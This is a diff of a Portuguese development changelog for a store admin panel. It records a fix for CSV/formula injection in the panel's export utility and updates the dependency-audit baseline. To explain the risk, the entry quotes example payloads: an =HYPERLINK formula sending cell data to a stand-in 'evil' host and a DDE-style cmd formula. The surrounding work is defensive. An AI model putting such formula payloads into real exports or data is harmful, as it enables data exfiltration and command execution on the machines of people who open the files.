@@ -3,17 +3,57 @@
 Backlog priorizado e histórico do loop diário de evolução. Cada execução entrega
 uma fatia de valor com disciplina de TDD e zero-regressão (tsc limpo + testes verdes).
 
-## Baseline atual (2026-08-08)
+## Baseline atual (2026-08-24)
 
-- `npm ci`: ok. `npm audit`: **8 vulnerabilidades** (3 moderate, 5 high), todas
-  transitivas de `react-router`/`react-router-dom`; `npm audit fix` sem `--force`
-  disponível — avaliar em fatia dedicada (mexe no roteador, requer validação).
+- `npm ci`: ok. `npm audit`: **8 vulnerabilidades** (3 moderate, 5 high) —
+  `postcss` (high, **dev/build-only**, path traversal em sourceMappingURL) e
+  `react-router`/`react-router-dom` (moderate, open redirect + constructor
+  injection em SSR hydration, que este painel SPA não usa). Fix só via major
+  bump (`vite`/roteador) — fatia dedicada com validação de build; nenhuma é
+  runtime-exploitable no bundle de produção atual.
 - `npx tsc --noEmit`: **limpo**.
-- `npm test`: **708 testes / 158 suítes verdes** (era 705/157; +3/+1 desta fatia).
-- `npm run build` (vite): **ok** (~14s).
-- `npm run lint`: gate em 400 warnings; **255 warnings** restantes (0 errors).
+- `npm test`: **1174 testes / 212 suítes verdes** (era 1166/212; +8 desta fatia).
+- `npm run build` (tsc && vite build, igual à Vercel): **ok** (~16s).
 
 ## Histórico
+
+### 2026-08-24 — Segurança: proteção contra CSV/formula injection nos exports
+- **Medido:** varredura de segurança a nível de código. Todos os exports de CSV
+  do painel passam por `src/utils/csv.ts` (`toCsv`/`escapeCell`), usado por
+  `reports/AnalyticsPage.tsx` (faturamento, produtos, **clientes**, estoque) e
+  `reports/sections/shared.tsx`. O `escapeCell` fazia o *quoting* RFC-4180
+  correto (`;`, `"`, `\n`) mas **não tinha guarda contra CSV/formula injection**:
+  uma célula de texto que começa com `=`, `+`, `-`, `@`, tab ou CR é executada
+  como fórmula pelo Excel/LibreOffice/Sheets ao abrir o arquivo. Como os exports
+  carregam dados **controlados pelo cliente** (nome, telefone, e-mail vindos da
+  vitrine), um cliente com nome `=HYPERLINK("http://evil/?x="&A1,"clique")` ou
+  `=cmd|'/c ...'!A1` executaria a fórmula **na máquina do lojista** ao abrir o
+  relatório — exfiltração de dados / execução de comando (OWASP CSV Injection).
+- **Mudado (`src/utils/csv.ts`, superfície única de todos os exports):** no ramo
+  de **texto** do `escapeCell`, quando o valor começa com um gatilho de fórmula
+  (`/^[=+\-@\t\r]/`), prefixa `'` para forçar interpretação como texto. O ramo de
+  **número** fica intocado — um valor negativo (`-50,5`) precisa continuar
+  numérico no Excel; e cabeçalhos/labels são constantes do dev. Telefones que
+  começam com `+` passam a ser exportados como texto (comportamento desejado:
+  preserva o dígito inicial). Depois do prefixo, o *quoting* existente ainda se
+  aplica (ex.: `=A;B` → `"'=A;B"`).
+- **Teste (TDD):** `src/utils/__tests__/csv.test.ts` ampliado — 6 casos novos
+  escritos **vermelhos antes, verdes depois**: os 4 gatilhos (`= + - @`), a
+  fórmula clássica `=HYPERLINK` (prefixo + aspeamento), o gatilho de tab/CR, e
+  dois casos de regressão que **já passavam** e travam o comportamento seguro
+  (número negativo permanece numérico; texto comum intacto).
+- **Antes/depois:** `npm test` 1166/212 → **1174/212**; `tsc --noEmit` limpo,
+  `eslint` limpo nos arquivos tocados e `vite build` ok nos dois lados. Mudança
+  cirúrgica numa única função utilitária compartilhada, risco baixo.
+- **Próximo passo priorizado:** (1) **Segurança/deps:** planejar o major bump de
+  `vite` (corrige o `postcss` dev-only) e de `react-router` 6→7 (open redirect),
+  cada um como fatia dedicada com validação de build. (2) **Estados de erro:**
+  as páginas de query maduras já cobertas (Analytics/Payments/Customers/
+  ConversationInsights); continuar a varredura em `reports/sections` que somam
+  KPIs. (3) **Bundles pesados:** `vendor-charts` (375 kB) e `index` (308 kB) —
+  investigar code-splitting/lazy nas telas de relatório.
+
+### 2026-08-08 — A11y: nome acessível no `Switch` compartilhado (WCAG 4.1.2)
 
 ### 2026-08-08 — A11y: nome acessível no `Switch` compartilhado (WCAG 4.1.2)
 - **Medido:** o `Switch` de `src/components/common/Switch.tsx` renderiza um
